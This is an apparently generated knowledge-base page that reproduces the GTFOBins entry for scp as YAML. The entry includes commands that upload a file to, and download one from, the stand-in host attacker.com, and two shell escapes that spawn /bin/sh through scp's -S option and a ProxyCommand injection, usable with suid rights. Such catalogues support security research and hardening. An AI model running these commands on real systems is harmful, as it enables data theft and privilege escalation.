---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# scp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `scp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [scp](../../tools/linux/scp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | scp |
| name | scp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/scp/ |

## Preserved Source Material

```yaml
_body: ''
_name: scp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scp
functions:
  download:
  - code: scp user@attacker.com:/path/to/input-file /path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: ssh-server
  shell:
  - code: 'echo ''exec /bin/sh 0<&2 1>&2'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      scp -S /path/to/temp-file x x:'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  - code: 'scp -o ''ProxyCommand=;/bin/sh 0<&2 1>&2'' x x:'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  upload:
  - code: scp /path/to/input-file user@attacker.com:/path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: ssh-server
```
